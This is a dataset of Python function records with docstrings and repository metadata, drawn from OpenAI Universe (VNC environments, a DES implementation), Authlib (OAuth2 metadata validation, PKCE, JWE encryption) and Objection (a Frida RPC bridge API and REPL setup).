{"docstring": "# Add C keypress in order to \"commit\" the action, as\n# interpreted by the remote.\n", "func_signal": "def _step(self, action_n):\n", "code": "action_n = [action + [\n    spaces.KeyEvent.by_name('c', down=True),\n    spaces.KeyEvent.by_name('c', down=False)\n] for action in action_n]\n# Submit directly to VNC session, without popping rewards\nlogger.debug('Submitting actions: %s', action_n)\naction_n = self._compile_actions(action_n)\n_, obs_info_n = self.vnc_session.step(action_n)\n# Wait until the actions have actually happened\nself.rewarder_session.wait(timeout=5)\n\n# TODO: this is now present in the info messages; need to\n# update the implementation.\nwhen_n = [reward_buffer.info['reward_buffer.remote_time'] for reward_buffer in self.rewarder_session.reward_buffers]\nobservation_n, obs_info_n = self._flip_past(when_n)\n\nreward_n, reward_time_n, done_n, info_n = self.rewarder_session.pop()\nself._propagate_obs_info(info_n, obs_info_n)\n\n# Warn if we detect multiple rewards\nif any(info['stats.reward.count'] != 1 for info in info_n):\n    # Arrived but there was a bug\n    logger.warn('Likely bug: should have received 1 reward for every env, but instead received %s. Current return: observation=%s reward=%s done=%s info=%s', [info['stats.reward.count'] for info in info_n], observation_n, reward_n, done_n, info_n)\n\nreturn self._observation(observation_n), reward_n, done_n, {'n': info_n}", "path": "universe/universe/envs/vnc_core_env/vnc_core_env.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Check that environments start up without errors and that we can extract rewards and observations\"\"\"\n", "func_signal": "def test_smoke(env_id):\n", "code": "gym.undo_logger_setup()\nlogging.getLogger().setLevel(logging.INFO)\n\nenv = gym.make(env_id)\nif env.metadata.get('configure.required', False):\n    if os.environ.get('FORCE_LATEST_UNIVERSE_DOCKER_RUNTIMES'):  # Used to test universe-envs in CI\n        configure_with_latest_docker_runtime_tag(env)\n    else:\n        env.configure(remotes=1)\n\nenv = wrappers.Unvectorize(env)\n\nenv.reset()\n_rollout(env, timestep_limit=60*30) # Check a rollout", "path": "universe/tests/functional/test_envs.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Turn the list of bits -> data, into a string\"\"\"\n", "func_signal": "def __BitList_to_String(self, data):\n", "code": "result = []\npos = 0\nc = 0\nwhile pos < len(data):\n\tc += data[pos] << (7 - (pos % 8))\n\tif (pos % 8) == 7:\n\t\tresult.append(c)\n\t\tc = 0\n\tpos += 1\n\nif _pythonMajorVersion < 3:\n\treturn ''.join([ chr(c) for c in result ])\nelse:\n\treturn bytes(result)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Will set the Initial Value, used in conjunction with CBC mode\"\"\"\n", "func_signal": "def setIV(self, IV):\n", "code": "if not IV or len(IV) != self.block_size:\n\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\nIV = self._guardAgainstUnicode(IV)\nself._iv = IV", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "# Don't need to store the ID on the instance; it'll be retrieved\n# directly from the spec\n", "func_signal": "def WrappedGymCoreEnv(gym_core_id, fps=None, rewarder_observation=False):\n", "code": "env = wrap(envs.VNCEnv(fps=fps))\nif rewarder_observation:\n    env = GymCoreObservation(env, gym_core_id=gym_core_id)\nreturn env", "path": "universe/universe/wrappers/__init__.py", "commit_date": "2017-02-10 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Create the 16 subkeys K[1] to K[16] from the given key\"\"\"\n", "func_signal": "def __create_sub_keys(self):\n", "code": "key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))\ni = 0\n# Split into Left and Right sections\nself.L = key[:28]\nself.R = key[28:]\nwhile i < 16:\n\tj = 0\n\t# Perform circular left shifts\n\twhile j < des.__left_rotations[i]:\n\t\tself.L.append(self.L[0])\n\t\tdel self.L[0]\n\n\t\tself.R.append(self.R[0])\n\t\tdel self.R[0]\n\n\t\tj += 1\n\n\t# Create one of the 16 subkeys through pc2 permutation\n\tself.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)\n\n\ti += 1", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"Call from any thread\"\"\"\n", "func_signal": "def recv_rpc(self, context, payload):\n", "code": "logger.debug(\"Adding RPC payload to ControlBuffer queue: %s\", payload)\nself.buf.put(('rpc', (context, payload)))\nwith self.cv:\n    self.cv.notifyAll()", "path": "universe/universe/rewarder/remote.py", "commit_date": "2016-12-13 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"encrypt(data, [pad], [padmode]) -> bytes\n\ndata : bytes to be encrypted\npad  : Optional argument for encryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be encrypted\nwith the already specified key. Data does not have to be a\nmultiple of 8 bytes if the padding character is supplied, or\nthe padmode is set to PAD_PKCS5, as bytes will then added to\nensure the be padded data is a multiple of 8 bytes.\n\"\"\"\n", "func_signal": "def encrypt(self, data, pad=None, padmode=None):\n", "code": "ENCRYPT = des.ENCRYPT\nDECRYPT = des.DECRYPT\ndata = self._guardAgainstUnicode(data)\nif pad is not None:\n\tpad = self._guardAgainstUnicode(pad)\n# Pad the data accordingly.\ndata = self._padData(data, pad, padmode)\nif self.getMode() == CBC:\n\tself.__key1.setIV(self.getIV())\n\tself.__key2.setIV(self.getIV())\n\tself.__key3.setIV(self.getIV())\n\ti = 0\n\tresult = []\n\twhile i < len(data):\n\t\tblock = self.__key1.crypt(data[i:i+8], ENCRYPT)\n\t\tblock = self.__key2.crypt(block, DECRYPT)\n\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\tself.__key1.setIV(block)\n\t\tself.__key2.setIV(block)\n\t\tself.__key3.setIV(block)\n\t\tresult.append(block)\n\t\ti += 8\n\tif _pythonMajorVersion < 3:\n\t\treturn ''.join(result)\n\telse:\n\t\treturn bytes.fromhex('').join(result)\nelse:\n\tdata = self.__key1.crypt(data, ENCRYPT)\n\tdata = self.__key2.crypt(data, DECRYPT)\n\treturn self.__key3.crypt(data, ENCRYPT)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\ndata : Bytes to be encrypted\npad  : Optional argument for decryption padding. Must only be one byte\npadmode : Optional argument for overriding the padding mode.\n\nThe data must be a multiple of 8 bytes and will be decrypted\nwith the already specified key. In PAD_NORMAL mode, if the\noptional padding character is supplied, then the un-encrypted\ndata will have the padding characters removed from the end of\nthe bytes. This pad removal only occurs on the last 8 bytes of\nthe data (last data block). In PAD_PKCS5 mode, the special\npadding end markers will be removed from the data after decrypting.\n\"\"\"\n", "func_signal": "def decrypt(self, data, pad=None, padmode=None):\n", "code": "data = self._guardAgainstUnicode(data)\nif pad is not None:\n\tpad = self._guardAgainstUnicode(pad)\ndata = self.crypt(data, des.DECRYPT)\nreturn self._unpadData(data, pad, padmode)", "path": "universe/universe/vncdriver/vendor/pydes.py", "commit_date": "2016-12-05 00:00:00", "repo_name": "openai/universe", "stars": 7430, "license": "mit", "language": "python", "size": 1616}
{"docstring": "\"\"\"OPTIONAL. URL of a page containing human-readable information\nthat developers might want or need to know when using the\nauthorization server.  In particular, if the authorization server\ndoes not support Dynamic Client Registration, then information on\nhow to register clients needs to be provided in this\ndocumentation.\n\"\"\"\n", "func_signal": "def validate_service_documentation(self):\n", "code": "value = self.get('service_documentation')\nif value and not is_valid_url(value):\n    raise ValueError('\"service_documentation\" MUST be a URL')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"OPTIONAL.  URL of the authorization server's OAuth 2.0 Dynamic\nClient Registration endpoint [RFC7591].\n\"\"\"\n", "func_signal": "def validate_registration_endpoint(self):\n", "code": "url = self.get('registration_endpoint')\nif url and not is_secure_transport(url):\n    raise ValueError(\n        '\"registration_endpoint\" MUST use \"https\" scheme')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"Prepare the access token request. Per `Section 4.1.3`_.\n\nThe client makes a request to the token endpoint by adding the\nfollowing parameters using the ``application/x-www-form-urlencoded``\nformat in the HTTP request entity-body:\n\n:param grant_type: To indicate grant type being used, i.e. \"password\",\n        \"authorization_code\" or \"client_credentials\".\n:param body: Existing request body to embed parameters in.\n:param redirect_uri: If the \"redirect_uri\" parameter was included in the\n                     authorization request as described in\n                     `Section 4.1.1`_, and their values MUST be identical.\n:param kwargs: Extra arguments to embed in the request body.\n\nAn example of an authorization code token request body::\n\n    grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA\n    &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb\n\n.. _`Section 4.1.1`: https://tools.ietf.org/html/rfc6749#section-4.1.1\n.. _`Section 4.1.3`: https://tools.ietf.org/html/rfc6749#section-4.1.3\n\"\"\"\n", "func_signal": "def prepare_token_request(grant_type, body='', redirect_uri=None, **kwargs):\n", "code": "params = [('grant_type', grant_type)]\n\nif redirect_uri:\n    params.append(('redirect_uri', redirect_uri))\n\nif 'scope' in kwargs:\n    kwargs['scope'] = list_to_scope(kwargs['scope'])\n\nif grant_type == 'authorization_code' and 'code' not in kwargs:\n    raise MissingCodeException()\n\nfor k in kwargs:\n    if kwargs[k]:\n        params.append((to_unicode(k), kwargs[k]))\n\nreturn add_params_to_qs(body, params)", "path": "authlib/authlib/oauth2/rfc6749/parameters.py", "commit_date": "2019-01-02 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"OPTIONAL.  JSON array containing a list of the JWS signing\nalgorithms (\"alg\" values) supported by the introspection endpoint\nfor the signature on the JWT [JWT] used to authenticate the client\nat the introspection endpoint for the \"private_key_jwt\" and\n\"client_secret_jwt\" authentication methods.  This metadata entry\nMUST be present if either of these authentication methods are\nspecified in the \"introspection_endpoint_auth_methods_supported\"\nentry.  No default algorithms are implied if this entry is\nomitted.  The value \"none\" MUST NOT be used.\n\"\"\"\n", "func_signal": "def validate_introspection_endpoint_auth_signing_alg_values_supported(self):\n", "code": "_validate_alg_values(\n    self,\n    'introspection_endpoint_auth_signing_alg_values_supported',\n    self.introspection_endpoint_auth_methods_supported\n)", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"Create S256 code_challenge with the given code_verifier.\"\"\"\n", "func_signal": "def create_s256_code_challenge(code_verifier):\n", "code": "data = hashlib.sha256(to_bytes(code_verifier, 'ascii')).digest()\nreturn to_unicode(urlsafe_b64encode(data))", "path": "authlib/authlib/oauth2/rfc7636/challenge.py", "commit_date": "2020-11-13 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"URL of the authorization server's token endpoint [RFC6749]. This\nis REQUIRED unless only the implicit grant type is supported.\n\"\"\"\n", "func_signal": "def validate_token_endpoint(self):\n", "code": "grant_types_supported = self.get('grant_types_supported')\nif grant_types_supported and len(grant_types_supported) == 1 and \\\n        grant_types_supported[0] == 'implicit':\n    return\n\nurl = self.get('token_endpoint')\nif not url:\n    raise ValueError('\"token_endpoint\" is required')\n\nif not is_secure_transport(url):\n    raise ValueError('\"token_endpoint\" MUST use \"https\" scheme')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"REQUIRED. The authorization server's issuer identifier, which is\na URL that uses the \"https\" scheme and has no query or fragment\ncomponents.\n\"\"\"\n", "func_signal": "def validate_issuer(self):\n", "code": "issuer = self.get('issuer')\n\n#: 1. REQUIRED\nif not issuer:\n    raise ValueError('\"issuer\" is required')\n\nparsed = urlparse.urlparse(issuer)\n\n#: 2. uses the \"https\" scheme\nif not is_secure_transport(issuer):\n    raise ValueError('\"issuer\" MUST use \"https\" scheme')\n\n#: 3. has no query or fragment\nif parsed.query or parsed.fragment:\n    raise ValueError('\"issuer\" has no query or fragment')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"URL of the authorization server's authorization endpoint\n[RFC6749]. This is REQUIRED unless no grant types are supported\nthat use the authorization endpoint.\n\"\"\"\n", "func_signal": "def validate_authorization_endpoint(self):\n", "code": "url = self.get('authorization_endpoint')\nif url:\n    if not is_secure_transport(url):\n        raise ValueError(\n            '\"authorization_endpoint\" MUST use \"https\" scheme')\n    return\n\ngrant_types_supported = set(self.grant_types_supported)\nauthorization_grant_types = {'authorization_code', 'implicit'}\nif grant_types_supported & authorization_grant_types:\n    raise ValueError('\"authorization_endpoint\" is required')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "# https://tools.ietf.org/html/rfc7662#section-2.2\n", "func_signal": "def test_all_attributes(self):\n", "code": "token = IntrospectionToken()\nself.assertIsNone(token.active)\nself.assertIsNone(token.scope)\nself.assertIsNone(token.client_id)\nself.assertIsNone(token.username)\nself.assertIsNone(token.token_type)\nself.assertIsNone(token.exp)\nself.assertIsNone(token.iat)\nself.assertIsNone(token.nbf)\nself.assertIsNone(token.sub)\nself.assertIsNone(token.aud)\nself.assertIsNone(token.iss)\nself.assertIsNone(token.jti)", "path": "authlib/tests/core/test_oauth2/test_rfc7662.py", "commit_date": "2019-08-26 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"OPTIONAL.  URL that the authorization server provides to the\nperson registering the client to read about the authorization\nserver's terms of service.  The registration process SHOULD\ndisplay this URL to the person registering the client if it is\ngiven.  As described in Section 5, despite the identifier\n\"op_tos_uri\", appearing to be OpenID-specific, its usage in this\nspecification is actually referring to a general OAuth 2.0 feature\nthat is not specific to OpenID Connect.\n\"\"\"\n", "func_signal": "def validate_op_tos_uri(self):\n", "code": "value = self.get('op_tos_uri')\nif value and not is_valid_url(value):\n    raise ValueError('\"op_tos_uri\" MUST be a URL')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"Key Encryption with AES GCM\n\n:param msg: text to be encrypt in bytes\n:param aad: additional authenticated data in bytes\n:param iv: initialization vector in bytes\n:param key: encrypted key in bytes\n:return: (ciphertext, iv, tag)\n\"\"\"\n", "func_signal": "def encrypt(self, msg, aad, iv, key):\n", "code": "self.check_iv(iv)\ncipher = Cipher(AES(key), GCM(iv), backend=default_backend())\nenc = cipher.encryptor()\nenc.authenticate_additional_data(aad)\nciphertext = enc.update(msg) + enc.finalize()\nreturn ciphertext, enc.tag", "path": "authlib/authlib/jose/rfc7518/jwe_encs.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"OPTIONAL. URL of the authorization server's OAuth 2.0 revocation\nendpoint [RFC7009].\"\"\"\n", "func_signal": "def validate_revocation_endpoint(self):\n", "code": "url = self.get('revocation_endpoint')\nif url and not is_secure_transport(url):\n    raise ValueError('\"revocation_endpoint\" MUST use \"https\" scheme')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"The protected resource calls the introspection endpoint using an HTTP\n``POST`` request with parameters sent as\n\"application/x-www-form-urlencoded\" data. The protected resource sends a\nparameter representing the token along with optional parameters\nrepresenting additional context that is known by the protected resource\nto aid the authorization server in its response.\n\ntoken\n    **REQUIRED**  The string value of the token. For access tokens, this\n    is the ``access_token`` value returned from the token endpoint\n    defined in OAuth 2.0. For refresh tokens, this is the\n    ``refresh_token`` value returned from the token endpoint as defined\n    in OAuth 2.0.\n\ntoken_type_hint\n    **OPTIONAL**  A hint about the type of the token submitted for\n    introspection.\n\"\"\"\n", "func_signal": "def authenticate_token(self, request, client):\n", "code": "params = request.form\nif 'token' not in params:\n    raise InvalidRequestError()\n\nhint = params.get('token_type_hint')\nif hint and hint not in self.SUPPORTED_TOKEN_TYPES:\n    raise UnsupportedTokenTypeError()\n\ntoken = self.query_token(params['token'], hint)\nif token and self.check_permission(token, client, request):\n    return token", "path": "authlib/authlib/oauth2/rfc7662/introspection.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "# it is faster than the one in cryptography\n", "func_signal": "def sign(self, msg, key):\n", "code": "op_key = key.get_op_key('sign')\nreturn hmac.new(op_key, msg, self.hash_alg).digest()", "path": "authlib/authlib/jose/rfc7518/jws_algs.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"Parse authorization grant response URI into a dict.\n\nIf the resource owner grants the access request, the authorization\nserver issues an authorization code and delivers it to the client by\nadding the following parameters to the query component of the\nredirection URI using the ``application/x-www-form-urlencoded`` format:\n\n**code**\n        REQUIRED.  The authorization code generated by the\n        authorization server.  The authorization code MUST expire\n        shortly after it is issued to mitigate the risk of leaks.  A\n        maximum authorization code lifetime of 10 minutes is\n        RECOMMENDED.  The client MUST NOT use the authorization code\n        more than once.  If an authorization code is used more than\n        once, the authorization server MUST deny the request and SHOULD\n        revoke (when possible) all tokens previously issued based on\n        that authorization code.  The authorization code is bound to\n        the client identifier and redirection URI.\n\n**state**\n        REQUIRED if the \"state\" parameter was present in the client\n        authorization request.  The exact value received from the\n        client.\n\n:param uri: The full redirect URL back to the client.\n:param state: The state parameter from the authorization request.\n\nFor example, the authorization server redirects the user-agent by\nsending the following HTTP response:\n\n.. code-block:: http\n\n    HTTP/1.1 302 Found\n    Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA\n            &state=xyz\n\n\"\"\"\n", "func_signal": "def parse_authorization_code_response(uri, state=None):\n", "code": "query = urlparse.urlparse(uri).query\nparams = dict(urlparse.parse_qsl(query))\n\nif 'code' not in params:\n    raise MissingCodeException()\n\nif state and params.get('state', None) != state:\n    raise MismatchingStateException()\n\nreturn params", "path": "authlib/authlib/oauth2/rfc6749/parameters.py", "commit_date": "2019-01-02 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"Key Decryption with AES GCM\n\n:param ciphertext: ciphertext in bytes\n:param aad: additional authenticated data in bytes\n:param iv: initialization vector in bytes\n:param tag: authentication tag in bytes\n:param key: encrypted key in bytes\n:return: message\n\"\"\"\n", "func_signal": "def decrypt(self, ciphertext, aad, iv, tag, key):\n", "code": "self.check_iv(iv)\ncipher = Cipher(AES(key), GCM(iv, tag), backend=default_backend())\nd = cipher.decryptor()\nd.authenticate_additional_data(aad)\nreturn d.update(ciphertext) + d.finalize()", "path": "authlib/authlib/jose/rfc7518/jwe_encs.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"OPTIONAL.  URL that the authorization server provides to the\nperson registering the client to read about the authorization\nserver's requirements on how the client can use the data provided\nby the authorization server.  The registration process SHOULD\ndisplay this URL to the person registering the client if it is\ngiven.  As described in Section 5, despite the identifier\n\"op_policy_uri\" appearing to be OpenID-specific, its usage in this\nspecification is actually referring to a general OAuth 2.0 feature\nthat is not specific to OpenID Connect.\n\"\"\"\n", "func_signal": "def validate_op_policy_uri(self):\n", "code": "value = self.get('op_policy_uri')\nif value and not is_valid_url(value):\n    raise ValueError('\"op_policy_uri\" MUST be a URL')", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"OPTIONAL.  JSON array containing a list of the JWS signing\nalgorithms (\"alg\" values) supported by the revocation endpoint for\nthe signature on the JWT [JWT] used to authenticate the client at\nthe revocation endpoint for the \"private_key_jwt\" and\n\"client_secret_jwt\" authentication methods.  This metadata entry\nMUST be present if either of these authentication methods are\nspecified in the \"revocation_endpoint_auth_methods_supported\"\nentry.  No default algorithms are implied if this entry is\nomitted.  The value \"none\" MUST NOT be used.\n\"\"\"\n", "func_signal": "def validate_revocation_endpoint_auth_signing_alg_values_supported(self):\n", "code": "_validate_alg_values(\n    self,\n    'revocation_endpoint_auth_signing_alg_values_supported',\n    self.revocation_endpoint_auth_methods_supported\n)", "path": "authlib/authlib/oauth2/rfc8414/models.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "# the token is not active, does not exist on this server, or the\n# protected resource is not allowed to introspect this particular\n# token, then the authorization server MUST return an introspection\n# response with the \"active\" field set to \"false\"\n", "func_signal": "def create_introspection_payload(self, token):\n", "code": "if not token:\n    return {'active': False}\nif token.is_expired() or token.is_revoked():\n    return {'active': False}\npayload = self.introspect_token(token)\nif 'active' not in payload:\n    payload['active'] = True\nreturn payload", "path": "authlib/authlib/oauth2/rfc7662/introspection.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"Key Decryption with AES AES_CBC_HMAC_SHA2.\n\n:param ciphertext: ciphertext in bytes\n:param aad: additional authenticated data in bytes\n:param iv: initialization vector in bytes\n:param tag: authentication tag in bytes\n:param key: encrypted key in bytes\n:return: message\n\"\"\"\n", "func_signal": "def decrypt(self, ciphertext, aad, iv, tag, key):\n", "code": "self.check_iv(iv)\nhkey = key[:self.key_len]\ndkey = key[self.key_len:]\n\n_tag = self._hmac(ciphertext, aad, iv, hkey)\nif not hmac.compare_digest(_tag, tag):\n    raise InvalidTag()\n\ncipher = Cipher(AES(dkey), CBC(iv), backend=default_backend())\nd = cipher.decryptor()\ndata = d.update(ciphertext) + d.finalize()\nunpad = PKCS7(AES.block_size).unpadder()\nreturn unpad.update(data) + unpad.finalize()", "path": "authlib/authlib/jose/rfc7518/jwe_encs.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "lepture/authlib", "stars": 4182, "license": "bsd-3-clause", "language": "python", "size": 3283}
{"docstring": "\"\"\"\n    Creates a new Flask instance for the objection API\n\n    :return:\n\"\"\"\n\n", "func_signal": "def create_app() -> Flask:\n", "code": "app = Flask(__name__)\napp.register_blueprint(rpc.bp)\napp.register_blueprint(script.bp)\n\nreturn app", "path": "objection/objection/api/app.py", "commit_date": "2019-02-22 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Bridge a call to the Frida RPC. Endpoints may be sourced from\n    the agent's RPC exports.\n\n    Responses are JSON encoded by default, but can be raw by adding\n    ?json=false as a query string parameter.\n\n    :param method:\n    :return:\n\"\"\"\n\n", "func_signal": "def invoke(method):\n", "code": "method = to_snake_case(method)\n\n# post requests require a little more validation, so do that\nif request.method == 'POST':\n\n    # ensure we have some JSON formatted post data\n    post_data = request.get_json(force=True, silent=True)\n    if not post_data:\n        return abort(jsonify(message='POST request without a valid body received'))\n\ntry:\n\n    rpc = state_connection.get_api()\n\nexcept Exception as e:\n    return abort(jsonify(message='Failed to talk to the Frida RPC: {e}'.format(e=str(e))))\n\ntry:\n\n    # invoke the method based on the http request type\n    if request.method == 'POST':\n        response = getattr(rpc, method)(*post_data.values())\n\n    if request.method == 'GET':\n        response = getattr(rpc, method)()\n\n    if 'json' in request.args and request.args.get('json').lower() == 'false':\n        return response\n\nexcept Exception as e:\n    return abort(jsonify(message='Failed to call method: {e}'.format(e=str(e))))\n\nreturn jsonify(response)", "path": "objection/objection/api/rpc.py", "commit_date": "2019-02-21 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Prepares the self.script_src attribute based on a few rules.\n\n    If the script source is already set, simply return as there is\n        nothing for us to do.\n    If the script path is set, read that and populate the script_src\n        attribute.\n    If neither script_src not script_path is set, attempt to read the\n        index.js that lives next to the plugin file.\n\n    If all of the above fail, simply return, writing a debug warning\n        no script source could be found.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def _prepare_source(self):\n", "code": "if self.script_src:\n    return\n\nif self.script_path:\n    self.script_path = os.path.abspath(self.script_path)\n    with open(self.script_path, 'r', encoding='utf-8') as f:\n        self.script_src = '\\n'.join(f.readlines())\n    return\n\npossible_src = os.path.abspath(os.path.join(\n    os.path.abspath(os.path.dirname(self.plugin_file)), 'index.js'))\nif os.path.exists(possible_src):\n    self.script_path = possible_src\n    with open(self.script_path, 'r', encoding='utf-8') as f:\n        self.script_src = '\\n'.join(f.readlines())\n    return\n\ndebug_print('[warning] No Fridascript could be found for plugin {0}'.format(self.namespace))", "path": "objection/objection/utils/plugin.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Sets the values required to have a USB connection.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def use_usb(self) -> None:\n", "code": "self.network = False\nself.usb = True\nself._type = self.TYPE_USB", "path": "objection/objection/state/connection.py", "commit_date": "2018-07-30 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Creates a new instance of the plugin\n\n    :param ns:\n\"\"\"\n\n", "func_signal": "def __init__(self, ns):\n", "code": "self.script_src = s\n# self.script_path = os.path.join(os.path.dirname(__file__), \"script.js\")\n\nimplementation = {\n    'meta': 'Work with Frida version information',\n    'commands': {\n        'info': {\n            'meta': 'Get the current Frida version',\n            'exec': self.version\n        }\n    }\n}\n\nsuper().__init__(__file__, ns, implementation)\n\nself.inject()", "path": "objection/tests/data/plugin/__init__.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Return prompt tokens to use in the cli app.\n\n    If none were set during the init of this class, it\n    is assumed that the connection failed.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def get_prompt_message(self) -> list:\n", "code": "if self.prompt_tokens:\n    return self.prompt_tokens\n\nreturn [\n    ('class:applicationname', 'unknown application'),\n    ('class:on', ''),\n    ('class:devicetype', ''),\n    ('class:version', ' '),\n    ('class:connection', '[' + state_connection.get_comms_type_string() + '] # '),\n]", "path": "objection/objection/console/repl.py", "commit_date": "2019-06-21 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
{"docstring": "\"\"\"\n    Starts a new prompt session.\n\n    :return:\n\"\"\"\n\n", "func_signal": "def get_prompt_session(self) -> PromptSession:\n", "code": "return PromptSession(\n    history=FileHistory(os.path.expanduser('~/.objection/objection_history')),\n    completer=self.completer,\n    style=self.get_prompt_style(),\n    auto_suggest=AutoSuggestFromHistory(),\n    reserve_space_for_menu=4,\n    complete_in_thread=True,\n)", "path": "objection/objection/console/repl.py", "commit_date": "2019-06-21 00:00:00", "repo_name": "sensepost/objection", "stars": 6878, "license": "gpl-3.0", "language": "python", "size": 10887}
